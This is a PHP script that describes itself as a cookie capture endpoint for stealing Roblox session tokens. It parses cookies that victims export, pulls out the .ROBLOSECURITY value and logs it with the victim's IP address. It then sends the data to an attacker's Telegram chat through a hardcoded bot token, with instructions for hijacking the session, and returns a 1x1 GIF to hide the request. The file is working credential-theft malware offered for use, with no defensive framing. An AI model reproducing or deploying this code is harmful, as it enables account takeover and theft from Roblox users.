<?php
// api.php — Cookie capture endpoint
// Location: https://cosmo.baby/assets/RobloxSafari/api.php

$TG_TOKEN = '8860989517:AAF5xMj-l6s_YY2FGYTH06RJ_3CIIGIg4';
$TG_CHAT = '5310886054';
$LOG_FILE = __DIR__ . '/captures.log';

$cookie = $_GET['c'] ?? '';
$ip = $_SERVER['REMOTE_ADDR'];
$ua = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
$time = date('Y-m-d H:i:s');

if (strlen($cookie) > 3) {
    
    $has_roblox = false;
    $roblox_value = '';
    
    // Check if it's JSON (EditThisCookie export format)
    $json_data = json_decode($cookie, true);
    if ($json_data && is_array($json_data)) {
        // It's a JSON array of cookies — search for .ROBLOSECURITY
        foreach ($json_data as $c) {
            if (isset($c['name']) && $c['name'] === '.ROBLOSECURITY') {
                $has_roblox = true;
                $roblox_value = $c['value'] ?? '';
                break;
            }
        }
        // Log the full JSON
        $log_line = "[$time] IP: $ip | EditThisCookie JSON export | Cookie count: " . count($json_data) . "\n";
    } else {
        // Plain text cookie string — check for .ROBLOSECURITY
        $has_roblox = (strpos($cookie, '.ROBLOSECURITY') !== false || 
                       strpos($cookie, 'WARNING:-DO-NOT-SHARE') !== false);
        if ($has_roblox) {
            preg_match('/\.ROBLOSECURITY=([^;&]+)/', $cookie, $matches);
            if (!$matches) preg_match('/"value":"([^"]+)"/', $cookie, $matches);
            $roblox_value = $matches[1] ?? '';
        }
        $log_line = "[$time] IP: $ip | Raw cookie string\n";
    }
    
    // Log to file
    $flags = $has_roblox ? ' [HAS_ROBLOX]' : '';
    file_put_contents($LOG_FILE, $log_line . "$cookie\n\n", FILE_APPEND);
    
    // Build Telegram message
    $msg = "<b>" . ($has_roblox ? "🔥 ROBLOX COOKIE CAPTURED via EditThisCookie" : "📦 COOKIES EXPORTED") . "</b>\n";
    $msg .= "<b>Time:</b> $time\n";
    $msg .= "<b>IP:</b> $ip\n";
    $msg .= "<b>Browser:</b> Safari with EditThisCookie extension\n";
    $msg .= "<b>User-Agent:</b> " . substr($ua, 0, 150) . "\n\n";
    
    if ($has_roblox && $roblox_value) {
        $msg .= "<b>🎯 .ROBLOSECURITY Token:</b>\n<code>" . substr($roblox_value, 0, 300) . "</code>\n\n";
        $msg .= "<b>To use it:</b> Open Chrome DevTools → Application → Cookies → roblox.com\n";
        $msg .= "Add cookie: Name=<code>.ROBLOSECURITY</code>, Value=<code>" . substr($roblox_value, 0, 50) . "...</code>\n\n";
    }
    
    $msg .= "<b>Full export (" . strlen($cookie) . " chars):</b>\n<code>" . substr($cookie, 0, 400) . "</code>";
    
    $telegram_url = "https://api.telegram.org/bot$TG_TOKEN/sendMessage?" . 
                    "chat_id=$TG_CHAT&text=" . urlencode($msg) . "&parse_mode=HTML";
    @file_get_contents($telegram_url);
}

header('Content-Type: image/gif');
header('Cache-Control: no-cache, no-store, must-revalidate');
header('Access-Control-Allow-Origin: *');
echo base64_decode('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7');
?>
